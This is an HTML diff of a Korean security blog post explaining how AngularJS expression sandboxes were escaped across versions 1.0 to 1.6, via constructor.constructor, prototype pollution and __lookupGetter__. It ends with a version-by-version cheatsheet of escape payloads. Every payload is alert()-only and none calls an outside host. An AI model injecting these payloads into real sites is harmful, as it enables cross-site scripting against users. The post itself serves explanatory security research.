@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>AngularJS Sandbox Escape XSS | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="AngularJS Sandbox Escape로 알아보는 constructor XSS와 Prototype Pollution">
+    
+
+    
+    <meta property="og:title" content="AngularJS Sandbox Escape XSS">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-angularjs-sandboxdom-based/">
+  <meta property="og:description" content="AngularJS Sandbox Escape로 알아보는 constructor XSS와 Prototype Pollution">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="AngularJS Sandbox Escape XSS">
+  <meta name="twitter:description" content="AngularJS Sandbox Escape로 알아보는 constructor XSS와 Prototype Pollution">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-angularjs-sandboxdom-based/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"AngularJS Sandbox Escape XSS","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/web-hacking-angularjs-sandboxdom-based/","datePublished":"2017-07-12T00:00:00+00:00","dateModified":"2024-02-18T00:00:00+00:00","description":"AngularJS Sandbox Escape로 알아보는 constructor XSS와 Prototype Pollution","image":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og-images/blog-2017-web-hacking-angularjs-sandboxdom-based.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2017/"},{"@type":"ListItem","position":5,"name":"AngularJS Sandbox Escape XSS"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">AngularJS Sandbox Escape XSS</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2017-07-12">
+                        JULY 12, 2017
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">AngularJS Sandbox Escape로 알아보는 constructor XSS와 Prototype Pollution</p>
+            
+        </header>
+
+        <div class="post-body"><p>AngularJS는 웹 상에서 많이 사용되는 개발 프레임워크입니다. 이런 프레임워크에는 당연히 보안 로직, 정책이 들어가게되죠. 그 중에 대표적인 것은 바로 SandBox 입니다. Sandbox 로 인해 우리는 성공한 공격이 영향력이 없어지는 진귀한 광경을 목격하게되죠.</p>
+<p>많은 해커들은 버전별로 AngularJS sandbox를 우회하려 하였고 덕분에 각 버전별로 여러 사람이 만든 우회 루틴이 존재합니다. Angular에서 sandbox 는 1.1.5 버전 이후로부터 적용되었고 sandbox, 즉 Angular Expression으로 인해 로컬영역으로 묶인 sandbox 밖에서 함수 호출이 실패하게 됩니다. 자주 사용하는 DOM 기반의 XSS에 영향을 줄 수 있는 부분이죠.</p>
+<p>오늘은 AngularJS에 적용된 sandbox를 우회하는 방법과 Constructor에 대해 이야기할까 합니다.</p>
+<h2 id="constructor">Constructor</h2>
+<p>Javascript에선 모든 데이터가 Object입니다. 우리가 사용하는 Object 타입의 데이터, String, Array 등 모든 데이터는 Object로 표현됩니다. 아니 정확하겐 가장 중심이 되는 뿌리가 Object입니다.</p>
+<p>이러한 Object가 생성될 때 초기화 등을 위해 동작할 함수는 Constructor, 즉 생성자입니다. 타 언어에서의 생성자와 유사한 기능을 수행합니다. 그래서 새로운 Object를 선언하면 Constructor에 의해 생성이 아래 코드로 보면 <code>String</code>인 <code>alert(45)</code> 가 함수 형태로 생성되어 실행되는 걸 알 수 있죠.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>constructor<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(45)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<h2 id="escape-sandbox-of-angularjs-16">Escape Sandbox of AngularJS 1.6</h2>
+<p>이전 버전과는 다르게 오히려 최신버전에서는 아주 간단하게 우회가 가능합니다. Constructor는 생성자이기 떄문에  Sandbox 외부에서 함수 실행이 가능합니다. 그리고 각 Object의 constructor 들은 constructor의 constructor를 가지고 있습니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">.</span>constructor
+<span class="hljs-comment">/*
+</span><span class="hljs-comment">  function String() {
+</span><span class="hljs-comment">      [native code]
+</span><span class="hljs-comment">  }
+</span><span class="hljs-comment">*/</span>
+<span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">.</span>constructor
+<span class="hljs-comment">/*
+</span><span class="hljs-comment">  function Function() {
+</span><span class="hljs-comment">    [native code]
+</span><span class="hljs-comment">}
+</span><span class="hljs-comment">*/</span>
+</code></pre>
+<p>보통 <code>constructor.constructor</code>는 <code>Function()</code> 을 가리키기 떄문에 아래와 같이 String으로 원하는 함수를 넘겨서 실행할 수 있습니다. (이건 Eval과 비슷한 특징을 가지죠)</p>
+<pre><code class="language-javascript hljs">constructor<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(45)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>그래서 위에 보여드렸던 코드로 쉽게 sandbox 우회가 가능합니다. 너무 간단해서.. 더 설명드릴게 없네요.
+그럼 이전에는 어떤 방식으로 풀어나갔었는지 한번 볼까요?</p>
+<h2 id="escape-sandbox-of-angularjs-12">Escape Sandbox of AngularJS 1.2</h2>
+<p>Angular에 적용된 초기버전의 sandbox는 ensureSafeMemberName() 함수를 통해 구현되었고 이 함수는 Javascript 속성에 위에서 말한 생성자(constructor)가 있는지 검사하는 로직을 가집니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">function</span> ensureSafeMemberName<span class="hljs-punctuation">(</span>name<span class="hljs-punctuation">,</span> fullExpression<span class="hljs-punctuation">,</span> allowConstructor<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+ <span class="hljs-keyword">if</span><span class="hljs-punctuation">(</span>name <span class="hljs-operator">===</span> <span class="hljs-string">&quot;constructor&quot;</span> <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">!</span>allowConstructor<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+   <span class="hljs-keyword">throw</span> ���
+ <span class="hljs-punctuation">}</span>
+ <span class="hljs-keyword">if</span><span class="hljs-punctuation">(</span>name<span class="hljs-punctuation">.</span>charAt<span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">===</span> <span class="hljs-string">&#39;_&#39;</span> <span class="hljs-operator">||</span> name<span class="hljs-punctuation">.</span>charAt<span class="hljs-punctuation">(</span>name<span class="hljs-punctuation">.</span>length<span class="hljs-operator">-</span><span class="hljs-number">1</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">===</span> <span class="hljs-string">&#39;_&#39;</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">{</span>
+   <span class="hljs-keyword">throw</span> ���
+ <span class="hljs-punctuation">}</span>
+ <span class="hljs-keyword">return</span> name<span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+<p>초기의 우회루틴은 아래와 같은 형태로 이루어졌습니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-punctuation">{</span><span class="hljs-punctuation">{</span>
+a<span class="hljs-operator">=</span><span class="hljs-string">&#39;constructor&#39;</span><span class="hljs-punctuation">;</span>
+b<span class="hljs-operator">=</span><span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+a<span class="hljs-punctuation">.</span>sub<span class="hljs-punctuation">.</span>call<span class="hljs-punctuation">.</span>call<span class="hljs-punctuation">(</span>b<span class="hljs-punctuation">[</span>a<span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>getOwnPropertyDescriptor<span class="hljs-punctuation">(</span>b<span class="hljs-punctuation">[</span>a<span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>getPrototypeOf<span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">.</span>sub<span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span>a<span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>value<span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-string">&#39;alert(45)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+<span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span>
+</code></pre>
+<p>임의의 변수에 constructor 라는 문자열 값을 저장한 후 Object를 이용하여 constructor를 불러오고 인자값으로 실제 실행할 함수 이름과 값을 넘겨 실행합니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-keyword">typeof</span><span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">.</span>sub<span class="hljs-punctuation">.</span>call<span class="hljs-punctuation">.</span>call<span class="hljs-punctuation">)</span>
+<span class="hljs-comment">// function
+</span><span class="hljs-comment"></span>
+getOwnPropertyDescriptor
+<span class="hljs-comment">// 객체 내 자신의 속성에 대한 descriptor를 반환
+</span><span class="hljs-comment"></span>
+getPrototypeOf
+<span class="hljs-comment">// 객체의 [[Prototype]] 값을 반환
+</span><span class="hljs-comment"></span></code></pre>
+<p>간단하게 요약하자면 name의 문자열로 필터링을 하니 필터링 다른 변수에 속성값을 저장하고 로드해서 사용하는 식으로 우회된 케이스이지요. 물론 현재 이 방법은 패치가 되어있습니다. 1.2 버전 이하에서만 영향력이 있죠.</p>
+<p>다만 우리는 우회했던 방법에 대해선 잘 파악해둬야합니다.</p>
+<h2 id="escape-sandbox-of-angularjs-14">Escape Sandbox of AngularJS 1.4</h2>
+<p>여러 버전으로 업데이트 되면서 로직에 변화가 생기고 새로운 함수들이 나타났습니다. 1.4 버전에선 <code>__proto__</code> 와 <code>__defineSetter__</code> 를 통해 Sandbox 우회가 가능합니다. <code>__proto__</code>는 Safari, IE11에서 전역 선언이 가능해집니다. sandbox는 지역선언이 된 object를 해당 지역 이외로 나가지 못하도록(정확히는 나가면 실행이 되지 않게 함) 하지만 기능으로 전역 사용이 가능한 것이 나오고 말았죠.</p>
+<p>해커들은 이를 놓치지 않았습니다. <code>__proto__</code> 를 이용해서 전역변수와 같이 해당 area 이외 구간으로 넘어갈 수 있으니 쉽게 Bypass가 가능합니다. 바로 <a href="/cullinan/prototype-pollution/">Prototype Pollution</a>이죠.</p>
+<p>기존</p>
+<pre><code class="language-javascript hljs"><span class="hljs-punctuation">{</span>
+  <span class="hljs-literal">false</span><span class="hljs-punctuation">.</span>__proto__<span class="hljs-punctuation">.</span>hwul<span class="hljs-operator">=</span><span class="hljs-built_in">Function</span><span class="hljs-punctuation">;</span>
+  <span class="hljs-keyword">if</span><span class="hljs-punctuation">(</span><span class="hljs-operator">!</span><span class="hljs-literal">false</span><span class="hljs-punctuation">)</span><span class="hljs-literal">false</span><span class="hljs-punctuation">.</span>hwul<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(tata)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+<p><code>__proto__</code> 내 임의의 영역(코드에선 hwul)에 Function 을 집어넣고 x를 호출하여 익명함수로 만듭니다.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-literal">false</span><span class="hljs-punctuation">.</span>hwul
+<span class="hljs-comment">/*
+</span><span class="hljs-comment">  function Function() { [native code] }
+</span><span class="hljs-comment">*/</span>
+
+<span class="hljs-literal">false</span><span class="hljs-punctuation">.</span>hwul<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(45)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-comment">/*
+</span><span class="hljs-comment">  function anonymous() {
+</span><span class="hljs-comment">  alert(45)
+</span><span class="hljs-comment">  }
+</span><span class="hljs-comment">*/</span>
+</code></pre>
+<p>함수 형태로 넘겨주면 실행이 되니깐 정상적으로 <code>alert()</code> 함수가 실행됩니다. 물론 전역으로요.</p>
+<pre><code class="language-javascript hljs"><span class="hljs-literal">false</span><span class="hljs-punctuation">.</span>hwul<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(45)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+<span class="hljs-comment">// undefined
+</span><span class="hljs-comment"></span></code></pre>
+<p>Firefox 51에선 <code>__lookupGetter__</code> 를 통해서 함수의 호출자를 얻을 수 있습니다. 이땐 Firefox만 가능했던 기능이죠. 비슷한 맥락으로 <code>__lookupGetter__</code> 를 이용해 함수 호출자를 얻은 후 location 을 javascript 구문으로 바꾸어 상위 영역에서 함수를 호출합니다.</p>
+<pre><code class="language-javascript hljs">o<span class="hljs-operator">=</span><span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+l<span class="hljs-operator">=</span>o<span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">&#39;__lookupGetter__&#39;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">(</span>l<span class="hljs-operator">=</span>l<span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-string">&#39;event&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>target<span class="hljs-punctuation">.</span>defaultView<span class="hljs-punctuation">.</span>location<span class="hljs-operator">=</span><span class="hljs-string">&#39;javascript:alert(45)&#39;</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<p>이런식으로 Javascript단에서의 SandBox 탈출이 가능하죠. (Angular 기준)</p>
+<h2 id="angularjs-sandbox-escape-cheatsheet">AngularJS Sandbox Escape cheatsheet</h2>
+<p>1.0.1 - 1.1.5 == works</p>
+<pre><code class="language-javascript hljs">constructor<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(1)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>1.2.0 - 1.2.18 == works</p>
+<pre><code class="language-javascript hljs">a<span class="hljs-operator">=</span><span class="hljs-string">&#39;constructor&#39;</span><span class="hljs-punctuation">;</span>
+b<span class="hljs-operator">=</span><span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">;</span>
+a<span class="hljs-punctuation">.</span>sub<span class="hljs-punctuation">.</span>call<span class="hljs-punctuation">.</span>call<span class="hljs-punctuation">(</span>b<span class="hljs-punctuation">[</span>a<span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>getOwnPropertyDescriptor<span class="hljs-punctuation">(</span>b<span class="hljs-punctuation">[</span>a<span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>getPrototypeOf<span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">.</span>sub<span class="hljs-punctuation">)</span><span class="hljs-punctuation">,</span>a<span class="hljs-punctuation">)</span><span class="hljs-punctuation">.</span>value<span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-string">&#39;alert(1)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<p>1.2.19 - 1.2.23 == works</p>
+<pre><code class="language-javascript hljs">toString<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">.</span>prototype<span class="hljs-punctuation">.</span>toString<span class="hljs-operator">=</span>toString<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">.</span>prototype<span class="hljs-punctuation">.</span>call<span class="hljs-punctuation">;</span>
+<span class="hljs-punctuation">[</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;alert(1)&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>sort<span class="hljs-punctuation">(</span>toString<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<p>1.2.24 - 1.2.29 == not working</p>
+<pre><code class="language-javascript hljs"><span class="hljs-string">&#39;a&#39;</span><span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">.</span>prototype<span class="hljs-punctuation">.</span>charAt<span class="hljs-operator">=</span><span class="hljs-string">&#39;&#39;</span><span class="hljs-punctuation">.</span>valueOf<span class="hljs-punctuation">;</span>
+$eval<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;x=&#39;\&quot;+(y=&#39;if(!window\\u002ex)alert(window\\u002ex=1)&#39;)+eval(y)+\&quot;&#39;&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<p>1.3.0 == not working (calls $$watchers)</p>
+<pre><code class="language-javascript hljs"><span class="hljs-operator">!</span>ready <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-punctuation">(</span>ready <span class="hljs-operator">=</span> <span class="hljs-literal">true</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-punctuation">(</span>
+   <span class="hljs-operator">!</span>call
+   <span class="hljs-operator">?</span> $$watchers<span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">.</span>get<span class="hljs-punctuation">(</span>toString<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">.</span>prototype<span class="hljs-punctuation">)</span>
+   <span class="hljs-operator">:</span> <span class="hljs-punctuation">(</span>a <span class="hljs-operator">=</span> apply<span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;&amp;</span>
+   <span class="hljs-punctuation">(</span>apply <span class="hljs-operator">=</span> constructor<span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;&amp;</span>
+   <span class="hljs-punctuation">(</span>valueOf <span class="hljs-operator">=</span> call<span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;&amp;</span>
+   <span class="hljs-punctuation">(</span><span class="hljs-string">&#39;&#39;</span><span class="hljs-operator">+</span><span class="hljs-string">&#39;&#39;</span><span class="hljs-punctuation">.</span>toString<span class="hljs-punctuation">(</span>
+   <span class="hljs-string">&#39;F = Function.prototype;&#39;</span> <span class="hljs-operator">+</span>
+   <span class="hljs-string">&#39;F.apply = F.a;&#39;</span> <span class="hljs-operator">+</span>
+   <span class="hljs-string">&#39;delete F.a;&#39;</span> <span class="hljs-operator">+</span>
+   <span class="hljs-string">&#39;delete F.valueOf;&#39;</span> <span class="hljs-operator">+</span>
+   <span class="hljs-string">&#39;alert(1);&#39;</span>
+  <span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>
+<span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<p>1.3.1 - 1.5.8 == not working (calls $eval)</p>
+<pre><code class="language-javascript hljs"><span class="hljs-string">&#39;a&#39;</span><span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">.</span>prototype<span class="hljs-punctuation">.</span>charAt<span class="hljs-operator">=</span><span class="hljs-string">&#39;&#39;</span><span class="hljs-punctuation">.</span>valueOf<span class="hljs-punctuation">;</span>
+$eval<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;x=alert(1)//&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">;</span>
+</code></pre>
+<p>1.6.0 &gt; == works (sandbox gone)</p>
+<pre><code class="language-javascript hljs">constructor<span class="hljs-punctuation">.</span>constructor<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;alert(1)&#39;</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+</code></pre>
+<h2 id="reference">Reference</h2>
+<ul>
+<li>http://blog.portswigger.net/2017/05/dom-based-angularjs-sandbox-escapes.html</li>
+<li>https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/Object/getOwnPropertyDescriptor</li>
+<li>https://muckycode.blogspot.kr/2015/04/javascript-constructor.html</li>
+<li>https://pixn-analytics-portfolio.forhm0220.chatgpt.site/cullinan/prototype-pollution/</li>
+</ul>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
